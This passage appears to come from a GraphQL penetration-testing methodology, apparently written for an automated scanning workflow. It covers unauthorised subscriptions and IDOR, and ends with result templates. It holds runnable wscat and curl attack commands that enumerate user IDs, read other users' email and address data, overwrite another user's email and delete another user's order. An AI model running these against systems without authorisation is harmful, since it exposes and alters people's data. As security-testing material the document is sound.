{"type": "start", "id": "1", "payload": {"query": "subscription { orderUpdated(userId: 999) { id total } }"}}
EOF

# === Test subscription to admin events ===
echo "=== Testing subscription to admin events ==="

wscat -c "$GRAPHQL_WS" << 'EOF'
{"type": "connection_init", "payload": {}}
{"type": "start", "id": "1", "payload": {"query": "subscription { adminNotification { message } }"}}
EOF
```

### Supabase Realtime via GraphQL

```bash
SUPABASE_URL="https://xxx.supabase.co"
ANON_KEY="..."

# Supabase uses separate realtime endpoint but test GraphQL subscriptions if enabled
wscat -c "wss://${SUPABASE_URL#https://}/graphql/v1" -H "apikey: $ANON_KEY" << 'EOF'
{"type": "connection_init", "payload": {"headers": {"apikey": "$ANON_KEY"}}}
{"type": "start", "id": "1", "payload": {"query": "subscription { profilesCollection { edges { node { id email } } } }"}}
EOF
```

### Output

```yaml
phase_17_9:
  status: completed

  subscription_tests:
    subscriptions_enabled: {true|false}
    anonymous_access: {true|false}

    unauthorized_subscriptions:
      - subscription: "userUpdated"
        result: "Received all user updates"
        severity: "HIGH"
      - subscription: "adminNotification"
        result: "Blocked"
        severity: "N/A"

    cross_user_subscriptions:
      result: "{VULNERABLE|BLOCKED}"
      data_exposed: "{description}"

  severity: "{based on data exposure}"
```

---

## Phase 17.10: IDOR via GraphQL (Extended)

### Objective
Test for Insecure Direct Object Reference (IDOR) vulnerabilities specific to GraphQL patterns.

### Execution

```bash
GRAPHQL_URL="https://target.com/graphql"
USER_TOKEN="..."
MY_USER_ID="123"

# === IDOR via ID argument ===
echo "=== Testing IDOR via ID arguments ==="

OTHER_IDS=("1" "2" "100" "999" "00000000-0000-0000-0000-000000000001")

for ID in "${OTHER_IDS[@]}"; do
  RESPONSE=$(curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -d "{\"query\": \"{ user(id: \\\"$ID\\\") { id email phone address } }\"}")

  if echo "$RESPONSE" | grep -q "email"; then
    echo "IDOR FOUND: Accessed user $ID"
  fi
done

# === IDOR via node interface ===
echo "=== Testing IDOR via node interface ==="

# GraphQL Relay pattern - global node IDs
NODE_IDS=("VXNlcjox" "VXNlcjoy" "T3JkZXI6MQ==")  # Base64 encoded

for NODE_ID in "${NODE_IDS[@]}"; do
  curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -d "{\"query\": \"{ node(id: \\\"$NODE_ID\\\") { ... on User { id email } ... on Order { id total } } }\"}"
done

# === IDOR via mutations ===
echo "=== Testing IDOR via mutations ==="

# Update another user's data
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query": "mutation { updateUser(id: \"999\", input: {email: \"hacked@test.com\"}) { id email } }"}'

# Delete another user's resource
curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query": "mutation { deleteOrder(id: \"other-user-order-123\") { id } }"}'

# === IDOR via nested objects ===
echo "=== Testing IDOR via nested objects ==="

curl -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query": "{ me { id } order(id: \"other-user-order-123\") { id total customer { email } } }"}'
```

### Output

```yaml
phase_17_10:
  status: completed

  idor_tests:
    read_access:
      vulnerable: {true|false}
      accessible_ids: [{list}]
      data_exposed: ["email", "phone", "address"]

    node_interface:
      vulnerable: {true|false}
      method: "Base64 ID enumeration"

    write_access:
      update_others: {true|false}
      delete_others: {true|false}

    nested_objects:
      vulnerable: {true|false}
      method: "Access via relationship"

  impact: "Full horizontal access to all user data"
  severity: "CRITICAL"
```

---

## Output Format

### FASE_17_RESULTS YAML Structure

```yaml
FASE_17_RESULTS:
  target_url: "{url}"
  graphql_endpoint: "{endpoint}"
  scan_timestamp: "{ISO timestamp}"
  status: "{completed|partial|skipped}"

  graphql_implementation:
    type: "{Apollo|Hasura|Supabase|AppSync|custom}"
    version: "{if detected}"

  # Core Checklist (17.1-17.5)
  introspection:
    enabled: {true|false}
    types_exposed: {count}
    sensitive_types: [{list}]
    severity: "{severity}"

  batch_attacks:
    allowed: {true|false}
    max_batch_size: {number}
    rate_limit_bypass: {true|false}
    severity: "{severity}"

  nested_queries:
    max_depth_allowed: {number}
    dos_potential: {true|false}
    response_times: [{depth: time_ms}]
    severity: "{severity}"

  alias_overloading:
    limit_enforced: {true|false}
    max_aliases: {number}
    severity: "{severity}"

  directive_abuse:
    custom_directives: [{list}]
    bypass_achieved: {true|false}
    severity: "{severity}"

  # Extended Analysis (17.6-17.10)
  schema_reconstruction:
    needed: {true|false}
    fields_discovered: {count}

  authorization_bypass:
    query_level: {true|false}
    field_level: {true|false}
    mutation_level: {true|false}
    severity: "{severity}"

  injection:
    sql_injection: {true|false}
    nosql_injection: {true|false}
    severity: "{severity}"

  subscriptions:
    exposed: {true|false}
    unauthorized_access: {true|false}
    severity: "{severity}"

  idor:
    read_access: {true|false}
    write_access: {true|false}
    severity: "{severity}"

  # Summary
  total_tests_executed: {number}
  vulnerabilities_found: {number}

  severity_summary:
    critical: {count}
    high: {count}
    medium: {count}
    low: {count}

  integration_status: "Added to SCAN-IN-PROGRESS.md"

  severity: "{highest severity among findings}"
```

---

## References

### Methodologies
- OWASP GraphQL Security Cheat Sheet
- GraphQL Security Best Practices (Apollo)
- HackerOne GraphQL Bug Bounty Reports

### Tools
- **GraphQL Voyager** - Schema visualization
- **InQL** - Burp Suite GraphQL scanner
- **graphql-cop** - GraphQL security scanner
- **Altair GraphQL Client** - Query testing

### Internal References
- `Documentos/App/CHECKLIST.md` - Master checklist (FASE 17)
- `references/graphql-payloads.md` - Injection payloads

---

## Error Handling

**If GraphQL not detected:**
```yaml
FASE_17_RESULTS:
  status: skipped
  reason: "No GraphQL endpoint detected in FASE 2"
  recommendation: "Skip to FASE 18 or re-run FASE 2"
```

**If introspection disabled:**
```yaml
FASE_17_RESULTS:
  status: partial
  introspection_disabled: true
  executed: ["17.6 Schema Reconstruction", "17.7-17.10"]
  note: "Proceed with schema reconstruction and blind testing"
```

**If rate limited:**
```yaml
FASE_17_RESULTS:
  status: partial
  rate_limited_at: "17.2 Batch Attacks"
  recommendation: "Add delays or use authenticated session"
```
